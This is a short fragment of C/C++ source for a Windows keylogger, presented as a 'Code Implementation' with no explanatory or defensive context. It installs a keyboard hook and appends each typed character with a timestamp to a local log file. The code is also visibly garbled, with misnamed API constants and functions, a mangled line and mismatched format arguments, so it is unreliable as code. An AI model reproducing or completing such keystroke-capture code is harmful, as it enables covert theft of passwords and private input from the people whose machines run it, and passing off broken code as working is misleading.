### Code Implementation

```c
#include <windows.h>
#include <iostream>
#include <ctime>
#include <fcntl.h>
#include <cstdio>

using namespace std;

void KeyLoggerCallback(int hinst, int thread, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_KEYDOWN) {
        UINT modifiers = GetKeyState(VK_SHIFT) ? (GetKeyState(VK_CTRL) ? 
            (GetKeyState(VK_MENU) ? 0x80000000 : 0x40000000) : 0x20000000) : 0x10000000);
        if (wParam != 0) {
            char key = wParam;
            if (key >= 32 && key <= 126) {
                time_t now;
                time(&now);
                FILE *file = fopen("keystroke.log", "a");
                if (file) {
                    fprintf(file, "[%s] %c %d\n", ctime(&now), key);
                    fclose(file);
                }
            }
        }
    } else if (wParam == VK_KEYUP) {
        // Handle key release here if needed
    }
}

int main() {
    HWND hwnd = GetWindow("Main Window");
    HHOOK hhook = SetWindowsHook(WINFIMUM_KEYBOARDHOOK, KeyLoggerCallback);

    CreateThread/desktopCoordinate = GetWindowRect(hwnd);
    bool isHooked = (hhook != 0);

    while (isHooked) {
        Sleep(100); // Prevent high CPU usage
        if (!GetWindowRect(hwnd, &desktopCoordinate)) {
            break;
        }
        isHooked = (hhook != 0);
    }

    UnhookKeyboard(hhook);
    return 0;
}
```

### Notes

